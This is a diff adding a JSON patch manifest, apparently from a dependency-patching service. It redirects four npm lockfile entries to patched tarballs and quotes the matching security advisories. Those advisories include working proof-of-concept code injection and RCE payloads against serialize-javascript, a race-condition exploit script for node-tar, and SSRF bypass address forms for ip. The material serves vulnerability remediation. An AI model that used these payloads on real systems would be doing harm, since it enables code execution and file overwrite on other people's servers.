@@ -1,0 +1,154 @@
+{
+  "version": 1,
+  "mode": "hosted",
+  "edits": [
+    {
+      "path": "package-lock.json",
+      "kind": "redirect_npm_lock_entry",
+      "action": "rewritten",
+      "key": "node_modules/ip",
+      "original": {
+        "resolved": "https://registry.npmjs.org/ip/-/ip-2.0.1.tgz",
+        "integrity": "sha512-lJUL9imLTNi1ZfXT+DU6rBBdbiKGBuay9B6xGSPVjUeQwaH1RIGqef8RZkUtHioLmSNpPR5M4HVKJGm1j8FWVQ=="
+      },
+      "new": {
+        "resolved": "https://patch.socket.dev/patch/npm/ip/2.0.1/06a76c00-13c6-440b-9143-1f1603dfe8ff/fb5ddc16-0ee0-4cc9-b2cd-0b81ccdad4fb/ip-2.0.1.tgz",
+        "integrity": "sha512-3MYZL6+01Ikk01avCxXJxLwldWdIjYdvQ5JPrvqiVVEekmW+6XIkzQXtbwNJ1nH+6X/w6P9ldref1tfX4LVm4w=="
+      }
+    },
+    {
+      "path": "package-lock.json",
+      "kind": "redirect_npm_lock_entry",
+      "action": "rewritten",
+      "key": "node_modules/serialize-javascript",
+      "original": {
+        "resolved": "https://registry.npmjs.org/serialize-javascript/-/serialize-javascript-3.1.0.tgz",
+        "integrity": "sha512-JIJT1DGiWmIKhzRsG91aS6Ze4sFUrYbltlkg2onR5OrnNM02Kl/hnY/T4FN2omvyeBbQmMJv+K4cPOpGzOTFBg=="
+      },
+      "new": {
+        "resolved": "https://patch.socket.dev/patch/npm/serialize-javascript/3.1.0/91168439-7341-4770-8388-83874b8b5cc7/7bf4a41e-30eb-466f-a51b-b82edd1202ac/serialize-javascript-3.1.0.tgz",
+        "integrity": "sha512-/qdivjTC3jtGHARyFIP+NcMu9evuvnc917gdmPnP8n299kixvNfjh4qh/y+eMO7vD2nHB9BU1WTjqtPxjfkVTg=="
+      }
+    },
+    {
+      "path": "package-lock.json",
+      "kind": "redirect_npm_lock_entry",
+      "action": "rewritten",
+      "key": "node_modules/tar",
+      "original": {
+        "resolved": "https://registry.npmjs.org/tar/-/tar-6.1.0.tgz",
+        "integrity": "sha512-DUCttfhsnLCjwoDoFcI+B2iJgYa93vBnDUATYEeRx6sntCTdN01VnqsIuTlALXla/LWooNg0yEGeB+Y8WdFxGA=="
+      },
+      "new": {
+        "resolved": "https://patch.socket.dev/patch/npm/tar/6.1.0/d6d43132-6605-40d7-b91c-3320bf347fd8/167721b8-d8ed-4469-b0cf-f343d73199aa/tar-6.1.0.tgz",
+        "integrity": "sha512-45j611bUGmLu4NO0AcilB4JvV7x5PEi1GU92PTSQt6MCFqafQZsU1hTlT0j5qAdYNxxOdgjCgXPXOlowG+E0DQ=="
+      }
+    },
+    {
+      "path": "package-lock.json",
+      "kind": "redirect_npm_lock_entry",
+      "action": "rewritten",
+      "key": "node_modules/xmldom",
+      "original": {
+        "resolved": "https://registry.npmjs.org/xmldom/-/xmldom-0.6.0.tgz",
+        "integrity": "sha512-iAcin401y58LckRZ0TkI4k0VSM1Qg0KGSc3i8rU+xrxe19A/BN1zHyVSJY7uoutVlaTSzYyk/v5AmkewAP7jtg=="
+      },
+      "new": {
+        "resolved": "https://patch.socket.dev/patch/npm/xmldom/0.6.0/e72e22d8-d4f7-42cd-a617-35ab63be91e0/4bada17e-58e6-41ed-9a76-5d4de89323a1/xmldom-0.6.0.tgz",
+        "integrity": "sha512-jx/omteuZjDoo5Qk2rQs29bt/HhJUuix4+MYxvQVRbsbxVmWbdhoilUHgyuyH57/HCRijw/IeQ/eZvHeAApxDg=="
+      }
+    }
+  ],
+  "records": {
+    "pkg:npm/ip@2.0.1": {
+      "uuid": "fb5ddc16-0ee0-4cc9-b2cd-0b81ccdad4fb",
+      "exportedAt": "Fri, 24 Apr 2026 19:30:17 GMT",
+      "files": {
+        "package/lib/ip.js": {
+          "beforeHash": "3b1379b253b12ae1f3a1229a6cddb7532c44c5d378f27652dc9d9a81edd0001c",
+          "afterHash": "ecf9d1c1b0920342db06ebbd39081a87f204c1d9cb24edf419a569ce45a9f84b"
+        }
+      },
+      "vulnerabilities": {
+        "GHSA-2p57-rm9w-gvfp": {
+          "cves": [
+            "CVE-2024-29415"
+          ],
+          "summary": "ip SSRF improper categorization in isPublic",
+          "severity": "HIGH",
+          "description": "The ip package through 2.0.1 for Node.js might allow SSRF because some IP addresses (such as 127.1, 01200034567, 012.1.2.3, 000:0:0000::01, and ::fFFf:127.0.0.1) are improperly categorized as globally routable via isPublic. NOTE: this issue exists because of an incomplete fix for CVE-2023-42282."
+        }
+      },
+      "description": "",
+      "license": "MIT",
+      "tier": "free"
+    },
+    "pkg:npm/serialize-javascript@3.1.0": {
+      "uuid": "7bf4a41e-30eb-466f-a51b-b82edd1202ac",
+      "exportedAt": "Mon, 27 Jul 2026 21:52:41 GMT",
+      "files": {
+        "index.js": {
+          "beforeHash": "6bc7c25986eae8718dac89aeac9377e9b1e2a0d41bd360df47210eb5a3229a7c",
+          "afterHash": "8f004c3915c239ccac93b47ddb3b4edb9f714c11989aadcd41819294e66cea79"
+        }
+      },
+      "vulnerabilities": {
+        "GHSA-5c6j-r48x-rmvq": {
+          "cves": [],
+          "summary": "Serialize JavaScript is Vulnerable to RCE via RegExp.flags and Date.prototype.toISOString()",
+          "severity": "HIGH",
+          "description": "### Impact\n\nThe serialize-javascript npm package (versions <= 7.0.2) contains a code injection vulnerability. It is an incomplete fix for CVE-2020-7660.\n\nWhile `RegExp.source` is sanitized, `RegExp.flags` is interpolated directly into the generated output without escaping. A similar issue exists in `Date.prototype.toISOString()`.\n\nIf an attacker can control the input object passed to `serialize()`, they can inject malicious JavaScript via the flags property of a RegExp object. When the serialized string is later evaluated (via `eval`, `new Function`, or `<script>` tags), the injected code executes.\n\n```javascript\nconst serialize = require('serialize-javascript');\n// Create an object that passes instanceof RegExp with a spoofed .flags\nconst fakeRegex = Object.create(RegExp.prototype);\nObject.defineProperty(fakeRegex, 'source', { get: () => 'x' });\nObject.defineProperty(fakeRegex, 'flags', {\n  get: () => '\"+(global.PWNED=\"CODE_INJECTION_VIA_FLAGS\")+\"'\n});\nfakeRegex.toJSON = function() { return '@placeholder'; };\nconst output = serialize({ re: fakeRegex });\n// Output: {\"re\":new RegExp(\"x\", \"\"+(global.PWNED=\"CODE_INJECTION_VIA_FLAGS\")+\"\")}\nlet obj;\neval('obj = ' + output);\nconsole.log(global.PWNED); // \"CODE_INJECTION_VIA_FLAGS\" — injected code executed!\n#h2. PoC 2: Code Injection via Date.toISOString()\n```\n\n```javascript\nconst serialize = require('serialize-javascript');\nconst fakeDate = Object.create(Date.prototype);\nfakeDate.toISOString = function() { return '\"+(global.DATE_PWNED=\"DATE_INJECTION\")+\"'; };\nfakeDate.toJSON = function() { return '2024-01-01'; };\nconst output = serialize({ d: fakeDate });\n// Output: {\"d\":new Date(\"\"+(global.DATE_PWNED=\"DATE_INJECTION\")+\"\")}\neval('obj = ' + output);\nconsole.log(global.DATE_PWNED); // \"DATE_INJECTION\" — injected code executed!\n#h2. PoC 3: Remote Code Execution\n```\n\n```javascript\nconst serialize = require('serialize-javascript');\nconst rceRegex = Object.create(RegExp.prototype);\nObject.defineProperty(rceRegex, 'source', { get: () => 'x' });\nObject.defineProperty(rceRegex, 'flags', {\n  get: () => '\"+require(\"child_process\").execSync(\"id\").toString()+\"'\n});\nrceRegex.toJSON = function() { return '@rce'; };\nconst output = serialize({ re: rceRegex });\n// Output: {\"re\":new RegExp(\"x\", \"\"+require(\"child_process\").execSync(\"id\").toString()+\"\")}\n// When eval'd on a Node.js server, executes the \"id\" system command\n```\n\n### Patches\n\nThe fix has been published in version 7.0.3. https://github.com/yahoo/serialize-javascript/releases/tag/v7.0.3"
+        }
+      },
+      "description": "",
+      "license": "",
+      "tier": "free"
+    },
+    "pkg:npm/tar@6.1.0": {
+      "uuid": "167721b8-d8ed-4469-b0cf-f343d73199aa",
+      "exportedAt": "Fri, 31 Jul 2026 00:18:54 GMT",
+      "files": {
+        "lib/path-reservations.js": {
+          "beforeHash": "5f8d390ac65fe0bc2ca1ba7317bd744cbc6f876dc6f7c2d6257cea307e8674a9",
+          "afterHash": "3bc72b80c33bd72cfadf450eef6bfcd03bfb82919191eae258c74a78769e3040"
+        }
+      },
+      "vulnerabilities": {
+        "GHSA-r6q2-hw4h-h46w": {
+          "cves": [
+            "CVE-2026-23950"
+          ],
+          "summary": "Race Condition in node-tar Path Reservations via Unicode Ligature Collisions on macOS APFS",
+          "severity": "HIGH",
+          "description": "**TITLE**: Race Condition in node-tar Path Reservations via Unicode Sharp-S (ß) Collisions on macOS APFS\n\n**AUTHOR**: Tomás Illuminati\n\n### Details\n\nA race condition vulnerability exists in `node-tar` (v7.5.3) this is to an incomplete handling of Unicode path collisions in the `path-reservations` system. On case-insensitive or normalization-insensitive filesystems (such as macOS APFS, In which it has been tested), the library fails to lock colliding paths (e.g., `ß` and `ss`), allowing them to be processed in parallel. This bypasses the library's internal concurrency safeguards and permits Symlink Poisoning attacks via race conditions. The library uses a `PathReservations` system to ensure that metadata checks and file operations for the same path are serialized. This prevents race conditions where one entry might clobber another concurrently.\n\n```typescript\n// node-tar/src/path-reservations.ts (Lines 53-62)\nreserve(paths: string[], fn: Handler) {\n    paths =\n      isWindows ?\n        ['win32 parallelization disabled']\n      : paths.map(p => {\n          return stripTrailingSlashes(\n            join(normalizeUnicode(p)), // <- THE PROBLEM FOR MacOS FS\n          ).toLowerCase()\n        })\n\n```\n\nIn MacOS the ```join(normalizeUnicode(p)), ``` FS confuses ß with ss, but this code does not. For example:\n\n``````bash\nbash-3.2$ printf \"CONTENT_SS\\n\" > collision_test_ss\nbash-3.2$ ls\ncollision_test_ss\nbash-3.2$ printf \"CONTENT_ESSZETT\\n\" > collision_test_ß\nbash-3.2$ ls -la\ntotal 8\ndrwxr-xr-x   3 testuser  staff    96 Jan 19 01:25 .\ndrwxr-x---+ 82 testuser  staff  2624 Jan 19 01:25 ..\n-rw-r--r--   1 testuser  staff    16 Jan 19 01:26 collision_test_ss\nbash-3.2$ \n``````\n\n---\n\n### PoC\n\n``````javascript\nconst tar = require('tar');\nconst fs = require('fs');\nconst path = require('path');\nconst { PassThrough } = require('stream');\n\nconst exploitDir = path.resolve('race_exploit_dir');\nif (fs.existsSync(exploitDir)) fs.rmSync(exploitDir, { recursive: true, force: true });\nfs.mkdirSync(exploitDir);\n\nconsole.log('[*] Testing...');\nconsole.log(`[*] Extraction target: ${exploitDir}`);\n\n// Construct stream\nconst stream = new PassThrough();\n\nconst contentA = 'A'.repeat(1000);\nconst contentB = 'B'.repeat(1000);\n\n// Key 1: \"f_ss\"\nconst header1 = new tar.Header({\n    path: 'collision_ss',\n    mode: 0o644,\n    size: contentA.length,\n});\nheader1.encode();\n\n// Key 2: \"f_ß\"\nconst header2 = new tar.Header({\n    path: 'collision_ß',\n    mode: 0o644,\n    size: contentB.length,\n});\nheader2.encode();\n\n// Write to stream\nstream.write(header1.block);\nstream.write(contentA);\nstream.write(Buffer.alloc(512 - (contentA.length % 512))); // Padding\n\nstream.write(header2.block);\nstream.write(contentB);\nstream.write(Buffer.alloc(512 - (contentB.length % 512))); // Padding\n\n// End\nstream.write(Buffer.alloc(1024));\nstream.end();\n\n// Extract\nconst extract = new tar.Unpack({\n    cwd: exploitDir,\n    // Ensure jobs is high enough to allow parallel processing if locks fail\n    jobs: 8 \n});\n\nstream.pipe(extract);\n\nextract.on('end', () => {\n    console.log('[*] Extraction complete');\n\n    // Check what exists\n    const files = fs.readdirSync(exploitDir);\n    console.log('[*] Files in exploit dir:', files);\n    files.forEach(f => {\n        const p = path.join(exploitDir, f);\n        const stat = fs.statSync(p);\n        const content = fs.readFileSync(p, 'utf8');\n        console.log(`File: ${f}, Inode: ${stat.ino}, Content: ${content.substring(0, 10)}... (Length: ${content.length})`);\n    });\n\n    if (files.length === 1 || (files.length === 2 && fs.statSync(path.join(exploitDir, files[0])).ino === fs.statSync(path.join(exploitDir, files[1])).ino)) {\n        console.log('\\[*] GOOD');\n    } else {\n        console.log('[-] No collision');\n    }\n});\n\n``````\n\n---\n\n### Impact\nThis is a **Race Condition** which enables **Arbitrary File Overwrite**. This vulnerability affects users and systems using **node-tar on macOS (APFS/HFS+)**. Because of using `NFD` Unicode normalization (in which `ß` and `ss` are different), conflicting paths do not have their order properly preserved under filesystems that ignore Unicode normalization (e.g., APFS (in which `ß` causes an inode collision with `ss`)). This enables an attacker to circumvent internal parallelization locks (`PathReservations`) using conflicting filenames within a malicious tar archive.\n\n---\n\n### Remediation\n\nUpdate `path-reservations.js` to use a normalization form that matches the target filesystem's behavior (e.g., `NFKD`), followed by first `toLocaleLowerCase('en')` and then `toLocaleUpperCase('en')`.\n\nUsers who cannot upgrade promptly, and who are programmatically using `node-tar` to extract arbitrary tarball data should filter out all `SymbolicLink` entries (as npm does) to defend against arbitrary file writes via this file system entry name collision issue.\n\n---"
+        }
+      },
+      "description": "",
+      "license": "",
+      "tier": "free"
+    },
+    "pkg:npm/xmldom@0.6.0": {
+      "uuid": "4bada17e-58e6-41ed-9a76-5d4de89323a1",
+      "exportedAt": "Thu, 02 Apr 2026 20:57:33 GMT",
+      "files": {
+        "package/lib/dom.js": {
+          "beforeHash": "48041cba3eb17e77648d22b342d3051537c58d88305f4925f629978c0bdb9b69",
+          "afterHash": "064d95b32a16b359ced51d4a6979e9a965b8edbaa8bcf77e851e9e786b108eff"
+        }
+      },
+      "vulnerabilities": {
+        "GHSA-crh6-fp67-6883": {
+          "cves": [
+            "CVE-2022-39353"
+          ],
+          "summary": "xmldom allows multiple root nodes in a DOM",
+          "severity": "CRITICAL",
+          "description": "### Impact\nxmldom parses XML that is not well-formed because it contains multiple top level elements, and adds all root nodes to the `childNodes` collection of the `Document`, without reporting any error or throwing.\nThis breaks the assumption that there is only a single root node in the tree, which led to https://nvd.nist.gov/vuln/detail/CVE-2022-39299 and is a potential issue for dependents.\n\n### Patches\nUpdate to `@xmldom/xmldom@~0.7.7`, `@xmldom/xmldom@~0.8.4` (dist-tag `latest`) or `@xmldom/xmldom@>=0.9.0-beta.4` (dist-tag `next`).\n\n### Workarounds\nOne of the following approaches might help, depending on your use case:\n- Instead of searching for elements in the whole DOM, only search in the `documentElement`.\n- Reject a document with a document that has more then 1 `childNode`.\n\n### References\n- https://nvd.nist.gov/vuln/detail/CVE-2022-39299\n- https://github.com/jindw/xmldom/issues/150\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Email us at security@xmldom.org\n"
+        }
+      },
+      "description": "",
+      "license": "MIT",
+      "tier": "free"
+    }
+  }
+}
